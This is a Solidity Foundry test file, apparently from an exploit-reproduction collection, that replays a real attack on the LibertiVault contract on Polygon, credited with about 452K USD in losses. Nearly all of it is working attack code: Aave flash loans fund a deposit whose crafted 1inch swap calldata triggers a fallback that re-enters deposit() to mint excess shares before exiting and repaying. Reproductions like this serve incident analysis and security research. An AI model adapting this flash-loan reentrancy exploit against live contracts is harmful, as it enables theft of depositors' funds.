// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : ~452K USD$
// Attacker : https://polygonscan.com/address/0xfd2d3ffb05ad00e61e3c8d8701cb9036b7a16d02
// Attack Contract : https://polygonscan.com/address/0xdfcdb5a86b167b3a418f3909d6f7a2f2873f2969
// Vulnerable Contract : https://polygonscan.com/address/0x9c80a455ecaca7025a45f5fa3b85fd6a462a447b
// Attack Tx : https://polygonscan.com/tx/0x7320accea0ef1d7abca8100c82223533b624c82d3e8d445954731495d4388483

// @Info
// Vulnerable Contract Code : https://polygonscan.com/address/0x9c80a455ecaca7025a45f5fa3b85fd6a462a447b#code

// @Analysis
// Twitter Guy : https://twitter.com/peckshield/status/1678688731908411393
// Twitter Guy : https://twitter.com/Phalcon_xyz/status/1678694679767031809

interface ILibertiVault {
    function deposit(uint256 assets, address receiver, bytes calldata data) external returns (uint256 shares);
    function exit() external returns (uint256 amountToken0, uint256 amountToken1);
}

interface IAggregationExecutor {
    /// @notice Make calls on `msgSender` with specified data
    function callBytes(address msgSender, bytes calldata data) external payable; // 0x2636f7f8
}

interface oneInchV4Router {
    struct SwapDescription {
        IERC20 srcToken;
        IERC20 dstToken;
        address payable srcReceiver;
        address payable dstReceiver;
        uint256 amount;
        uint256 minReturnAmount;
        uint256 flags;
        bytes permit;
    }

    function swap(
        IAggregationExecutor caller,
        SwapDescription calldata desc,
        bytes calldata data
    ) external payable returns (uint256 returnAmount, uint256 spentAmount, uint256 gasLeft);
}

contract ContractTest is Test {
    IERC20 USDT = IERC20(0xc2132D05D31c914a87C6611C10748AEb04B58e8F);
    IERC20 WETH = IERC20(0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619);
    IAaveFlashloan aaveV2 = IAaveFlashloan(0x8dFf5E27EA6b7AC08EbFdf9eB090F32ee9a30fcf);
    ILibertiVault LibertiVault = ILibertiVault(0x9c80a455ecaca7025A45F5fa3b85Fd6A462a447b);
    oneInchV4Router inchV4Router = oneInchV4Router(0x1111111254fb6c44bAC0beD2854e76F90643097d);
    Uni_Router_V3 Router = Uni_Router_V3(0xE592427A0AEce92De3Edee1F18E0157C05861564);
    uint256 nonce;

    function setUp() public {
        vm.createSelectFork("polygon", 44_941_584);
        vm.label(address(USDT), "USDT");
        vm.label(address(WETH), "WETH");
        vm.label(address(aaveV2), "aaveV2");
        vm.label(address(inchV4Router), "inchV4Router");
    }

    function testExploit() external {
        deal(address(WETH), address(this), 0.004 ether);
        WETH.approve(address(LibertiVault), type(uint256).max);
        address[] memory assets = new address[](1);
        assets[0] = address(USDT);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 5_000_000 * 1e6;
        uint256[] memory modes = new uint[](1);
        modes[0] = 0;
        aaveV2.flashLoan(address(this), assets, amounts, modes, address(this), "", 0);
        aaveV2.flashLoan(address(this), assets, amounts, modes, address(this), "", 0);

        emit log_named_decimal_uint(
            "Attacker USDT balance after exploit", USDT.balanceOf(address(this)), USDT.decimals()
        );

        emit log_named_decimal_uint(
            "Attacker WETH balance after exploit", WETH.balanceOf(address(this)), WETH.decimals()
        );
    }

    function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address initiator,
        bytes calldata params
    ) external returns (bool) {
        USDT.approve(address(aaveV2), type(uint256).max);

        bytes memory callData = setData();
        LibertiVault.deposit(0.001 ether, address(this), callData);

        LibertiVault.exit();
        if (USDT.balanceOf(address(this)) < (amounts[0] + premiums[0])) {
            WETHToUSDT(amounts[0], premiums[0]);
        }
        return true;
    }

    // function callBytes(address msgSender, bytes calldata data) external payable {
    //     nonce++;
    //     if (nonce % 2 == 1) {
    //         bytes memory callData = setData();
    //         LibertiVault.deposit(0.001 ether, address(this), callData); // re-enter the 'deposit()' during callBytes() call to manipulate the totalSupply , mint more share
    //     }
    //     USDT.transfer(address(inchV4Router), 2_500_000 * 1e6);
    // }

    fallback() external payable {
        nonce++;
        if (nonce % 2 == 1) {
            bytes memory callData = setData();
            LibertiVault.deposit(0.001 ether, address(this), callData); // re-enter the 'deposit()' during callBytes() call to manipulate the totalSupply , mint more share
        }
        USDT.transfer(address(inchV4Router), 2_500_000 * 1e6);
    }

    function setData() internal view returns (bytes memory data) {
        //1inchV4Router.swap(caller, desc, data)
        IAggregationExecutor caller = IAggregationExecutor(address(this));
        oneInchV4Router.SwapDescription memory desc = oneInchV4Router.SwapDescription(
            WETH, USDT, payable(address(this)), payable(address(LibertiVault)), 252_700 * 1e9, 1, 0, ""
        );
        data = abi.encodeWithSelector(bytes4(0x7c025200), caller, desc, new bytes(1));
        return data;
    }

    function WETHToUSDT(uint256 amount, uint256 premium) internal {
        WETH.approve(address(Router), type(uint256).max);
        Uni_Router_V3.ExactOutputSingleParams memory _Param = Uni_Router_V3.ExactOutputSingleParams({
            tokenIn: address(WETH),
            tokenOut: address(USDT),
            fee: 3000,
            recipient: address(this),
            deadline: block.timestamp,
            amountOut: amount + premium - USDT.balanceOf(address(this)),
            amountInMaximum: type(uint256).max,
            sqrtPriceLimitX96: 0
        });
        Router.exactOutputSingle(_Param);
    }
}
